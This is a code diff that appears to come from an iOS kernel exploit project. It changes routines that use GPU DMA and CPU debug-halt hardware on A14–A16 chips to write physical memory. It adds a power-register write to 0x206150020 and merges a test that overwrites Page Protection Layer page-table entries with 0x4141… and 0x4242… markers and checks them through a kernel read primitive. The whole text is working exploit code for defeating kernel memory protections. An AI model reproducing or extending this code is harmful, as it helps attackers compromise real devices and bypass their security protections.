@@ -17,6 +17,9 @@ struct shit_map {
     uint64_t pa;
     uint8_t *map;
 };
+
+bool isa15a16 = false;
+
 #define CACHED_MAP_LEN 20
 struct shit_map gCachedMap[CACHED_MAP_LEN];
 
@@ -118,18 +121,17 @@ void gfx_power_init(void)
 
     uint64_t base = 0;
     uint32_t command = 0;
-    bool isa15a16 = false;
 
     switch (cpuFamily) {
         case 0x8765EDEA: // A16
         base = 0x23B700408;
         command = 0x1F0023FF;
-        isa15a16=true;
+        isa15a16 = true;
         break;
         case 0xDA33D83D: // A15
         base = 0x23B7003C8;
         command = 0x1F0023FF;
-        isa15a16=true;
+        isa15a16 = true;
         break;
         case 0x1B588BB3: // A14
         base = 0x23B7003D0;
@@ -153,18 +155,6 @@ void gfx_power_init(void)
             }
         }
     }
-    /*
-    if(isa15a16) {
-        if(base6150020_back == 1) {
-            uint64_t base6150000 = (uint64_t)IOSurface_map(0x206150000, 0x100);
-            base6150020 = base6150000 + 0x20;
-            base6150020_back = 0;
-            }
-        printf("%llx\n", base6150020);
-        printf("%llx\n", base6150020_back);
-        kwrite64_kfd(base6150020, 1);
-    }
-     */
 }
 
 void dma_ctrl_1(void)
@@ -417,16 +407,18 @@ void dma_writevirt8(uint64_t pa, uint8_t val)
 void dma_perform(void (^block)(void))
 {
     gfx_power_init();
+    if(isa15a16) {
+        physwrite64_mapped(0x206150020, 1);
+    }
+    
     ml_dbgwrap_halt_cpu();
     
     block();
     
     ml_dbgwrap_unhalt_cpu();
-    /*
-    if(base6150020_back != 1){
-        *(uint64_t *)base6150020 = base6150020_back;
+    if(isa15a16) {
+        physwrite64_mapped(0x206150020, 0);
     }
-     */
 }
 
 bool test_pplrw_phys(void)
@@ -442,15 +434,12 @@ bool test_pplrw_phys(void)
     __block bool work1 = false, work2 = false;
     dma_perform(^{
         dma_writephys64(table + 8, 0x4141414141414141);
+        dma_writephys64(table + 16, 0x4242424242424242);
         
         if (kread64_kfd(table_v + 8) == 0x4141414141414141) {
             dma_writephys64(table + 8, og1);
             work1 = true;
         }
-    });
-    
-    dma_perform(^{
-        dma_writephys64(table + 16, 0x4242424242424242);
         if (kread64_kfd(table_v + 16) == 0x4242424242424242) {
             dma_writephys64(table + 16, og2);
             work2 = true;
